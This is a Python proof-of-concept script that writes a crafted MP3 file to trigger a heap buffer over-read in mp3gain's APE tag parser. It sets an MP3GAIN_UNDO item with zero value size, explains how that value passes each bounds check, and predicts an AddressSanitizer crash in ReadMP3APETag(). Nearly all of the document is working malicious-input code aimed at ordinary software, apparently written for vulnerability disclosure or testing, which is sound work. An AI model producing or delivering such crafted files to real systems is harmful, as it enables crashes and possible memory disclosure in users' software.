#!/usr/bin/env python3
"""
PoC generator for mp3gain APE Tag MP3GAIN_UNDO Heap Buffer Over-Read (VULN 001).

Vulnerability: ReadMP3APETag() in apetag.c lines 226-253
- When APE item key = "MP3GAIN_UNDO" and vsize = 0:
  - value = malloc(vsize+1) = malloc(1)  --> only 1 byte allocated
  - memcpy(tmpString, vp, 4)             --> reads 4 bytes from 1-byte buffer
  - heap buffer over-read (CWE-125)
"""

import struct
import os

OUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.mp3")

# ---------------------------------------------------------------------------
# 1. Minimal MPEG1 Layer3 frame
#    Header bytes: FF FB 90 C0
#      FF       = sync (8 bits)
#      FB = 1111 1011
#             sync(3) | MPEG1(2b=11) | Layer3(2b=01) | no-CRC(1b=1)
#      90 = 1001 0000
#             bitrate=128kbps(4b=1001) | 44100Hz(2b=00) | no-pad(1b=0) | private(1b=0)
#      C0 = 1100 0000
#             single-ch(2b=11) | mode-ext(2b=00) | not-copyrighted(1b=0) | not-original(1b=0) | no-emphasis(2b=00)
#    Frame length for 128kbps, 44100Hz, no padding = floor(144*128000/44100) = 417 bytes
# ---------------------------------------------------------------------------

FRAME_HEADER = bytes([0xFF, 0xFB, 0x90, 0xC0])
FRAME_LEN = 417  # bytes
mp3_frame = FRAME_HEADER + b'\x00' * (FRAME_LEN - len(FRAME_HEADER))

# ---------------------------------------------------------------------------
# 2. APEv2 tag (footer-only approach, no header)
#
# APE item format:
#   value_size  : uint32 LE  -- ZERO to trigger bug
#   item_flags  : uint32 LE  -- 0
#   key         : null-terminated ASCII
#   value       : value_size bytes (empty here)
#
# The check in apetag.c line 202:
#   isize >= remaining          → 12 >= 13? NO
#   vsize > MAX_FIELD_SIZE      → 0 > 1M?  NO
#   isize+1+vsize > remaining   → 13 > 13? NO  (passes all checks)
# Then malloc(1), then memcpy(tmpString, vp, 4) → OOB read
# ---------------------------------------------------------------------------

KEY = b"MP3GAIN_UNDO\x00"    # 13 bytes (12 chars + null)
VSIZE = 0                    # trigger: malloc(1) then memcpy(...,4)

ape_item  = struct.pack("<I", VSIZE)   # value_size = 0
ape_item += struct.pack("<I", 0)       # item_flags = 0
ape_item += KEY                        # key (null-terminated)
# value: 0 bytes (empty)

items_bytes = ape_item
items_size  = len(items_bytes)         # 4+4+13+0 = 21 bytes

# APEv2 footer (32 bytes):
#   "APETAGEX"  8 bytes  -- magic
#   version     4 bytes LE = 2000
#   tag_size    4 bytes LE = items_size + 32 (footer counts itself)
#   item_count  4 bytes LE = 1
#   flags       4 bytes LE = 0x00000000 (footer, no separate header)
#   reserved    8 bytes zero

TAG_SIZE = items_size + 32  # footer is included in tag_size per APEv2 spec

ape_footer  = b"APETAGEX"
ape_footer += struct.pack("<I", 2000)      # version
ape_footer += struct.pack("<I", TAG_SIZE)  # tag_size = 21 + 32 = 53
ape_footer += struct.pack("<I", 1)         # item_count
ape_footer += struct.pack("<I", 0)         # flags: 0 = footer, no header present
ape_footer += b'\x00' * 8                  # reserved

assert len(ape_footer) == 32, f"Footer must be 32 bytes, got {len(ape_footer)}"

# ---------------------------------------------------------------------------
# 3. Assemble: [MP3 frame] [APE items] [APE footer]
# ---------------------------------------------------------------------------

payload = mp3_frame + items_bytes + ape_footer

with open(OUT_FILE, "wb") as f:
    f.write(payload)

print(f"[+] Written {len(payload)} bytes to {OUT_FILE}")
print(f"    MP3 frame  : {len(mp3_frame)} bytes")
print(f"    APE items  : {items_size} bytes  (1 item, key=MP3GAIN_UNDO, vsize=0)")
print(f"    APE footer : 32 bytes  (TAG_SIZE={TAG_SIZE})")
print(f"[+] Expected: ASAN heap-buffer-overflow in ReadMP3APETag() at apetag.c:230")
